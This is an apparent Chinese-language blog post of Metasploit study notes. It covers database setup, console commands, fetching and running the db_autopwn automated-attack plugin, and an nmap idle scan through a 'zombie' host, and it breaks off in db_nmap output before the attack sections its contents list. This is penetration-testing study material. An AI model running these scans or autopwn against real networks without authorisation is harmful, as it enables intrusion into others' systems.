<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Metasploit</title>
    <meta name="description" content="整理了下以前看Metasploit资料做的部分笔记">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/06/17/Metasploit/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>Metasploit</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-06-17
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
    
        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
    
        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>&nbsp;
    
        <!--a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a-->
        <a href="/tag/#tools" title="Tag: tools" rel="tag">tools</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <p>整理了下以前看Metasploit资料做的部分笔记</p>

<ul id="markdown-toc">
  <li><a href="#armitage" id="markdown-toc-armitage">Armitage</a></li>
  <li><a href="#msfconsole" id="markdown-toc-msfconsole">MSFConsole</a>    <ul>
      <li><a href="#msf数据库" id="markdown-toc-msf数据库">msf数据库</a></li>
      <li><a href="#db_autopwn" id="markdown-toc-db_autopwn">db_autopwn</a></li>
    </ul>
  </li>
  <li><a href="#auxiliary" id="markdown-toc-auxiliary">auxiliary</a>    <ul>
      <li><a href="#scanneripipidseqtcp扫描空闲主机" id="markdown-toc-scanneripipidseqtcp扫描空闲主机">scanner/ip/ipidseq(TCP扫描空闲主机)</a></li>
      <li><a href="#db_nmap" id="markdown-toc-db_nmap">db_nmap</a></li>
      <li><a href="#端口扫描" id="markdown-toc-端口扫描">端口扫描</a></li>
      <li><a href="#扫描配置不当的mssql" id="markdown-toc-扫描配置不当的mssql">扫描配置不当的MSSQL</a></li>
      <li><a href="#暴力破解mssql" id="markdown-toc-暴力破解mssql">暴力破解MSSQL</a></li>
      <li><a href="#ssh服务器扫描" id="markdown-toc-ssh服务器扫描">ssh服务器扫描</a></li>
      <li><a href="#ftp扫描" id="markdown-toc-ftp扫描">FTP扫描</a></li>
      <li><a href="#简单网管协议扫描" id="markdown-toc-简单网管协议扫描">简单网管协议扫描</a></li>
    </ul>
  </li>
  <li><a href="#msfconsole启动插件" id="markdown-toc-msfconsole启动插件">msfconsole启动插件</a>    <ul>
      <li><a href="#wmap" id="markdown-toc-wmap">wmap</a></li>
      <li><a href="#nessus" id="markdown-toc-nessus">Nessus</a></li>
    </ul>
  </li>
  <li><a href="#attack" id="markdown-toc-attack">Attack</a>    <ul>
      <li><a href="#attack-windows_ms08_067" id="markdown-toc-attack-windows_ms08_067">attack windows_ms08_067</a></li>
      <li><a href="#全端口攻击载荷暴力猜解目标开放的端口" id="markdown-toc-全端口攻击载荷暴力猜解目标开放的端口">全端口攻击载荷，暴力猜解目标开放的端口</a></li>
      <li><a href="#资源文件" id="markdown-toc-资源文件">资源文件</a></li>
    </ul>
  </li>
  <li><a href="#meterpreter" id="markdown-toc-meterpreter">Meterpreter</a>    <ul>
      <li><a href="#getsystem命令通过各种向量攻击提升权限" id="markdown-toc-getsystem命令通过各种向量攻击提升权限"><strong><code class="highlighter-rouge">getsystem</code>命令，通过各种向量攻击提升权限</strong></a></li>
      <li><a href="#sysinfo可以获取系统运行的平台" id="markdown-toc-sysinfo可以获取系统运行的平台"><strong><code class="highlighter-rouge">sysinfo</code>，可以获取系统运行的平台</strong></a></li>
      <li><a href="#获取键盘记录" id="markdown-toc-获取键盘记录"><strong>获取键盘记录</strong>。</a></li>
      <li><a href="#挖掘用户名和密码" id="markdown-toc-挖掘用户名和密码"><strong>挖掘用户名和密码</strong></a>        <ul>
          <li><a href="#0x01提取密码哈希值" id="markdown-toc-0x01提取密码哈希值"><strong>0x01提取密码哈希值</strong>。</a></li>
          <li><a href="#0x02传递哈希值" id="markdown-toc-0x02传递哈希值"><strong>0x02传递哈希值</strong></a></li>
          <li><a href="#0x03权限提升" id="markdown-toc-0x03权限提升"><strong>0x03权限提升</strong></a></li>
        </ul>
      </li>
      <li><a href="#令牌假冒" id="markdown-toc-令牌假冒">令牌假冒</a></li>
    </ul>
  </li>
</ul>

<!--more-->

<p>metasploit由五个结构组成，库、接口、模块、插件、工具。</p>

<h2 id="armitage">Armitage</h2>

<p>shell直接运行<code class="highlighter-rouge">armitage</code>:</p>

<p><img src="/img/hack/Metasploit/1487236822452.png" alt="armitage" /></p>

<h2 id="msfconsole">MSFConsole</h2>

<h3 id="msf数据库">msf数据库</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config</span><span class="err">#</span> <span class="nx">su</span> <span class="nx">postgres</span>
<span class="nx">postgres</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config$</span> <span class="nx">createuser</span> <span class="nx">msf4</span> <span class="o">-</span><span class="nx">P</span>
<span class="nx">Enter</span> <span class="nx">password</span> <span class="k">for</span> <span class="k">new</span> <span class="nx">role</span><span class="p">:</span> 
<span class="nx">Enter</span> <span class="nx">it</span> <span class="nx">again</span><span class="p">:</span> 
<span class="nx">postgres</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config$</span> <span class="nx">createdb</span> <span class="o">--</span><span class="nx">owner</span><span class="o">=</span><span class="nx">msf4</span> <span class="nx">msf4</span>
</code></pre></div></div>

<blockquote>
  <p>msf4为创建的用户名
创建数据库。owner参数指定数据库的所有者，最后一个参数为数据库名称</p>
</blockquote>

<p>进入msf，连接数据库</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">postgres</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config$</span> <span class="nx">msfconsole</span>                                              <span class="p">...</span>
<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_connect</span> <span class="nx">msf4</span><span class="p">:</span><span class="nx">msf4</span><span class="p">@</span><span class="nd">localhost</span><span class="sr">/metasploit</span><span class="err">3
</span><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nb">Error</span> <span class="k">while</span> <span class="nx">running</span> <span class="nx">command</span> <span class="nx">db_connect</span><span class="p">:</span> <span class="nx">Failed</span> <span class="nx">to</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">database</span><span class="p">:</span> <span class="nx">PG</span><span class="p">::</span><span class="nx">InsufficientPrivilege</span><span class="p">:</span> <span class="nx">ERROR</span><span class="p">:</span>  <span class="nx">permission</span> <span class="nx">denied</span> <span class="nx">to</span> <span class="nx">create</span> <span class="nx">database</span>
<span class="p">:</span> <span class="nx">CREATE</span> <span class="nx">DATABASE</span> <span class="s2">"metasploit3"</span> <span class="nx">ENCODING</span> <span class="o">=</span> <span class="s1">'utf8'</span>
</code></pre></div></div>

<p>查看postgresql数据库的默认密码，并连接数据库</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config</span><span class="err">#</span> <span class="nx">vim</span> <span class="nx">database</span><span class="p">.</span><span class="nx">yml</span>
</code></pre></div></div>

<p><img src="/img/hack/Metasploit/1487254054731.png" alt="Alt text" /></p>

<p>查看数据库连接情况</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_connect</span> <span class="o">-</span><span class="nx">h</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="nx">Usage</span><span class="p">:</span> <span class="nx">db_connect</span> <span class="o">&lt;</span><span class="nx">user</span><span class="p">:</span><span class="nx">pass</span><span class="o">&gt;</span><span class="p">@</span><span class="o">&lt;</span><span class="nx">host</span><span class="p">:</span><span class="nx">port</span><span class="o">&gt;</span><span class="sr">/&lt;database</span><span class="err">&gt;
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span>       <span class="nx">OR</span><span class="p">:</span> <span class="nx">db_connect</span> <span class="o">-</span><span class="nx">y</span> <span class="p">[</span><span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">database</span><span class="p">.</span><span class="nx">yml</span><span class="p">]</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Examples</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>        <span class="nx">db_connect</span> <span class="nx">user</span><span class="p">@</span><span class="nd">metasploit3</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>        <span class="nx">db_connect</span> <span class="nx">user</span><span class="p">:</span><span class="nx">pass</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.0</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="nx">metasploit3</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>        <span class="nx">db_connect</span> <span class="nx">user</span><span class="p">:</span><span class="nx">pass</span><span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.0</span><span class="p">.</span><span class="mi">2</span><span class="p">:</span><span class="mi">1500</span><span class="o">/</span><span class="nx">metasploit3</span>
</code></pre></div></div>

<p>查看msf数据库情况</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_status</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">postgresql</span> <span class="nx">connected</span> <span class="nx">to</span> <span class="nx">msf</span>
</code></pre></div></div>

<p>初始化msf数据库</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="err">#</span> <span class="nx">msfdb</span> <span class="nx">init</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">irb</code>参数，进入irb脚本模式(ruby)，并且执行命令创建脚本</p>

<p><img src="/img/hack/Metasploit/1487226585243.png" alt="脚本模式" /></p>

<p>查看mefconsole存在的任务</p>

<p><img src="/img/hack/Metasploit/1487226678866.png" alt="jobs命令" /></p>

<p>load参数从metasploit的plug里面加载插件</p>

<p><img src="/img/hack/Metasploit/1487226740488.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">unload</code>参数终止启动的插件
<img src="/img/hack/Metasploit/1487226781525.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">resource</code>参数，可运行一些资源文件、工具。比如无线攻击就需要这个参数
<img src="/img/hack/Metasploit/1487226849995.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">route</code>参数用作跳板，词参数可以用作代理转发
<img src="/img/hack/Metasploit/1487226917629.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">search</code>参数。输入<code class="highlighter-rouge">search -h</code>参数和<code class="highlighter-rouge">help search</code>时候，会列出search命令的一些选项。</p>

<p><img src="/img/hack/Metasploit/1487227050143.png" alt="Alt text" /></p>

<ul>
  <li>
    <p>通过名称进行查找，<code class="highlighter-rouge">search name:</code>
<img src="/img/hack/Metasploit/1487227276220.png" alt="Alt text" /></p>
  </li>
  <li>
    <p>通过查找路径，<code class="highlighter-rouge">search path:</code>
<img src="/img/hack/Metasploit/1487227228078.png" alt="Alt text" /></p>
  </li>
  <li>
    <p>通过platform命令缩小查询范围，所查询的结果会列出比较高的模块。
<img src="/img/hack/Metasploit/1487227363443.png" alt="Alt text" /></p>
  </li>
  <li>
    <p>通过<code class="highlighter-rouge">search type:</code>查找（只能查找exploit、post、auxiliary三种模块）
<img src="/img/hack/Metasploit/1487227562789.png" alt="Alt text" /></p>
  </li>
  <li>
    <p>通过作者查找
<img src="/img/hack/Metasploit/1487227671666.png" alt="Alt text" /></p>
  </li>
  <li>
    <p>通过联合查询
<img src="/img/hack/Metasploit/1487227783430.png" alt="Alt text" /></p>
  </li>
</ul>

<p><code class="highlighter-rouge">session</code>参数，这个参数可以交互，查询或者终止当前的一些会话
<img src="/img/hack/Metasploit/1487227858407.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">set</code>参数，主要是对payload或者其他模块进行设置。
<img src="/img/hack/Metasploit/1487227934443.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">unset</code>参数是在使用set命令之后，发现设置错误，可以重新设置<img src="/img/hack/Metasploit/1487228033383.png" alt="Alt text" /></p>

<p><code class="highlighter-rouge">setg</code>参数类似于set，但是这个是全局变量，设置保存之后，这个漏洞的模块就不用重复设置在某一个模块设置全局变量之后，使用该模块的时候，需要检查option选项，以免做重复的渗透工作。同理，unsetg也可以重新设置</p>

<p><strong>show参数</strong>。单纯输入show，会显示所有的payload、利用模块、post模块、插件等。如<code class="highlighter-rouge">show exploits</code> 、<code class="highlighter-rouge">show payloads</code> 、<code class="highlighter-rouge">show encoders</code>、 <code class="highlighter-rouge">show nops</code></p>

<h3 id="db_autopwn">db_autopwn</h3>

<p>下载db_autopwn：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/hahwul/metasploit-db_autopwn/master/db_autopwn.rb
</code></pre></div></div>

<p>放入到<code class="highlighter-rouge">/usr/share/metasploit-framework/plugins</code>目录，然后在msf中<code class="highlighter-rouge">load db_autopwn</code>加载。</p>

<p>在使用了扫描之后可以使用<code class="highlighter-rouge">db_autopwn</code>自动化攻击：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSF &gt; db_autopwn -p -R great -e -q ip
</code></pre></div></div>

<h2 id="auxiliary">auxiliary</h2>

<h3 id="scanneripipidseqtcp扫描空闲主机">scanner/ip/ipidseq(TCP扫描空闲主机)</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">ip</span><span class="o">/</span><span class="nx">ipidseq</span> 
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ipidseq</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">ip</span><span class="o">/</span><span class="nx">ipidseq</span><span class="p">):</span>

   <span class="nx">Name</span>       <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">INTERFACE</span>                   <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">the</span> <span class="kr">interface</span>
   <span class="nx">RHOSTS</span>                      <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">RPORT</span>      <span class="mi">80</span>               <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">port</span>
   <span class="nx">SNAPLEN</span>    <span class="mi">65535</span>            <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">bytes</span> <span class="nx">to</span> <span class="nx">capture</span>
   <span class="nx">THREADS</span>    <span class="mi">1</span>                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">TIMEOUT</span>    <span class="mi">500</span>              <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">reply</span> <span class="nx">read</span> <span class="nx">timeout</span> <span class="k">in</span> <span class="nx">milliseconds</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ipidseq</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ipidseq</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">20</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">20</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ipidseq</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span><span class="s1">'s IPID sequence class: Incremental!
[*] 10.10.10.1'</span><span class="nx">s</span> <span class="nx">IPID</span> <span class="nx">sequence</span> <span class="kd">class</span><span class="p">:</span> <span class="nx">Incremental</span><span class="o">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">26</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">10</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">52</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">77</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">30</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">103</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">40</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="s1">'s IPID sequence class: All zeros
[*] Scanned 128 of 256 hosts (50% complete)
[*] Scanned 154 of 256 hosts (60% complete)
[*] Scanned 180 of 256 hosts (70% complete)
[*] Scanned 205 of 256 hosts (80% complete)
[*] Scanned 231 of 256 hosts (90% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
</span></code></pre></div></div>

<p>通过对扫描结果分析，发现多个空闲主机可用于空闲扫描。尝试在<code class="highlighter-rouge">-sI</code>选项指定10.10.10.2作为空闲主机对目标主机进行扫描。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ipidseq</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">PN</span> <span class="o">-</span><span class="nx">sI</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">exec</span><span class="p">:</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">PN</span> <span class="o">-</span><span class="nx">sI</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at -02-16 08:53 EST</span>
<span class="nx">Idle</span> <span class="nx">scan</span> <span class="nx">using</span> <span class="nx">zombie</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span><span class="p">:</span><span class="mi">80</span><span class="p">);</span> <span class="nl">Class</span><span class="p">:</span> <span class="nx">Incremental</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.053</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">992</span> <span class="nx">closed</span><span class="o">|</span><span class="nx">filtered</span> <span class="nx">ports</span>
<span class="nx">PORT</span>     <span class="nx">STATE</span> <span class="nx">SERVICE</span>
<span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ftp</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">http</span>
<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="mi">143</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">imap</span>
<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
<span class="mi">5001</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">commplex</span><span class="o">-</span><span class="nx">link</span>
<span class="mi">8080</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span><span class="o">-</span><span class="nx">proxy</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="nx">C</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="nx">DD</span><span class="p">:</span><span class="nx">B7</span><span class="p">:</span><span class="mi">5</span><span class="nx">B</span> <span class="p">(</span><span class="nx">VMware</span><span class="p">)</span>

<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">9.91</span> <span class="nx">seconds</span>

</code></pre></div></div>

<blockquote>
  <p>使用空闲扫描，可以不使用自身IP地址向目标发送任何数据包，就能获得目标主机上开放的端口信息。</p>
</blockquote>

<h3 id="db_nmap">db_nmap</h3>

<p>在msf中进行nmap扫描的之前需要连接数据库</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_nmap</span> <span class="o">-</span><span class="nx">sS</span> <span class="o">-</span><span class="nx">A</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2016-02-16 09:42 EST</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.00037</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">992</span> <span class="nx">closed</span> <span class="nx">ports</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">PORT</span>     <span class="nx">STATE</span> <span class="nx">SERVICE</span>     <span class="nx">VERSION</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ftp</span>         <span class="nx">vsftpd</span> <span class="mf">2.2</span><span class="p">.</span><span class="mi">2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ssh</span>         <span class="nx">OpenSSH</span> <span class="mf">5.3</span><span class="nx">p1</span> <span class="nx">Debian</span> <span class="mi">3</span><span class="nx">ubuntu4</span> <span class="p">(</span><span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
